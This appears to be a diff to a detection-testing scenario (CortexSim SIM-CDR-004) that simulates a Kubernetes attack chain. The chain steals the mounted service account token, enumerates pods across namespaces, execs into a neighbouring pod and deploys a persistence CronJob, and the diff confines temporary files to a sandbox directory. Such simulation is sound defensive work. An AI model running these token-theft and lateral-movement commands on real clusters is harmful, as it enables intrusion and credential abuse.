@@ -134,11 +134,12 @@ steps:
   - id: step-02
     name: "Steal service account token from mounted secret"
     command: |
+      rm -rf /tmp/cortexsim-cdr-004 && mkdir -m 755 /tmp/cortexsim-cdr-004 || { echo "sandbox /tmp/cortexsim-cdr-004 could not be created fresh: something else is at that path" >&2; exit 1; }
       TOKEN_PATH="/var/run/secrets/kubernetes.io/serviceaccount/token" && \
       echo '[*] Extracting service account token...' && \
       cat "$TOKEN_PATH" 2>/dev/null | cut -c1-80 && echo '...[truncated]' && \
-      cp "$TOKEN_PATH" /tmp/stolen_sa_token 2>/dev/null && \
-      echo "[!] Token copied to /tmp/stolen_sa_token" && \
+      cp "$TOKEN_PATH" /tmp/cortexsim-cdr-004/stolen_sa_token 2>/dev/null && \
+      echo "[!] Token copied to /tmp/cortexsim-cdr-004/stolen_sa_token" && \
       ls -la /var/run/secrets/kubernetes.io/serviceaccount/ && \
       echo '[*] Service account credential harvest complete'
     identity: container-runtime
@@ -162,9 +163,10 @@ steps:
   - id: step-03
     name: "kubectl get pods --all-namespaces via stolen SA token"
     command: |
-      which kubectl || (curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" -o /tmp/kubectl 2>/dev/null && chmod +x /tmp/kubectl && alias kubectl=/tmp/kubectl); \
-      KUBECTL=$(which kubectl 2>/dev/null || echo /tmp/kubectl) && \
-      TOKEN=$(cat /tmp/stolen_sa_token 2>/dev/null) && \
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim-cdr-004 2>/dev/null)" = "directory:$(id -u):755" ] || { echo "sandbox /tmp/cortexsim-cdr-004 is missing or not ours: step-02 did not complete" >&2; exit 1; }
+      which kubectl || (curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" -o /tmp/cortexsim-cdr-004/kubectl 2>/dev/null && chmod +x /tmp/cortexsim-cdr-004/kubectl && alias kubectl=/tmp/cortexsim-cdr-004/kubectl); \
+      KUBECTL=$(which kubectl 2>/dev/null || echo /tmp/cortexsim-cdr-004/kubectl) && \
+      TOKEN=$(cat /tmp/cortexsim-cdr-004/stolen_sa_token 2>/dev/null) && \
       APISERVER="https://kubernetes.default.svc" && \
       echo '[*] Enumerating all pods across namespaces...' && \
       "$KUBECTL" --server="$APISERVER" --token="$TOKEN" --insecure-skip-tls-verify \
@@ -191,8 +193,9 @@ steps:
   - id: step-04
     name: "kubectl exec into adjacent pod (lateral movement)"
     command: |
-      KUBECTL=$(which kubectl 2>/dev/null || echo /tmp/kubectl) && \
-      TOKEN=$(cat /tmp/stolen_sa_token 2>/dev/null) && \
+      s=$(stat -c %F:%u:%a /tmp/cortexsim-cdr-004 2>/dev/null); [ "$s" = "directory:0:755" ] || [ "$s" = "directory:$(id -u):755" ] || { echo "sandbox /tmp/cortexsim-cdr-004 is missing or not owned by root: step-02 did not complete" >&2; exit 1; }
+      KUBECTL=$(which kubectl 2>/dev/null || echo /tmp/cortexsim-cdr-004/kubectl) && \
+      TOKEN=$(cat /tmp/cortexsim-cdr-004/stolen_sa_token 2>/dev/null) && \
       APISERVER="https://kubernetes.default.svc" && \
       TARGET_POD=$("$KUBECTL" --server="$APISERVER" --token="$TOKEN" --insecure-skip-tls-verify \
         get pods --all-namespaces -o jsonpath='{.items[1].metadata.name}' 2>/dev/null) && \
@@ -223,10 +226,12 @@ steps:
   - id: step-05
     name: "Create malicious Kubernetes CronJob for persistence"
     command: |
-      KUBECTL=$(which kubectl 2>/dev/null || echo /tmp/kubectl) && \
-      TOKEN=$(cat /tmp/stolen_sa_token 2>/dev/null) && \
+      [ "$(stat -c %F:%u:%a /tmp/cortexsim-cdr-004 2>/dev/null)" = "directory:$(id -u):755" ] || { echo "sandbox /tmp/cortexsim-cdr-004 is missing or not ours: step-02 did not complete" >&2; exit 1; }
+      C=$(mktemp -d /tmp/cortexsim.XXXXXX) || exit 1; trap 'rm -rf "$C"' EXIT
+      KUBECTL=$(which kubectl 2>/dev/null || echo /tmp/cortexsim-cdr-004/kubectl) && \
+      TOKEN=$(cat /tmp/cortexsim-cdr-004/stolen_sa_token 2>/dev/null) && \
       APISERVER="https://kubernetes.default.svc" && \
-      cat > /tmp/cortexsim-cronjob.yaml << 'CRONEOF'
+      cat > "$C/cortexsim-cronjob.yaml" << 'CRONEOF'
       apiVersion: batch/v1
       kind: CronJob
       metadata:
@@ -247,7 +252,7 @@ steps:
                 restartPolicy: OnFailure
       CRONEOF
       "$KUBECTL" --server="$APISERVER" --token="$TOKEN" --insecure-skip-tls-verify \
-        apply -f /tmp/cortexsim-cronjob.yaml 2>&1 && \
+        apply -f "$C/cortexsim-cronjob.yaml" 2>&1 && \
       echo '[!] Malicious CronJob deployed for persistence' || echo '[-] CronJob creation failed — may require additional RBAC'
     identity: container-runtime
     mitre_technique: "T1053.005"
@@ -270,7 +275,8 @@ steps:
 cleanup:
   commands:
     - "kubectl --insecure-skip-tls-verify delete cronjob cortexsim-persistence-sim -n default 2>/dev/null || true"
-    - "rm -f /tmp/stolen_sa_token /tmp/pod_enum.txt /tmp/cortexsim-cronjob.yaml /tmp/kubectl"
+    - "rm -f /tmp/pod_enum.txt"
+    - "rm -rf /tmp/cortexsim-cdr-004"
     - "echo '[CortexSim] SIM-CDR-004 cleanup complete'"
   k8s_teardown: "kubectl delete -f {manifest_path}"
 
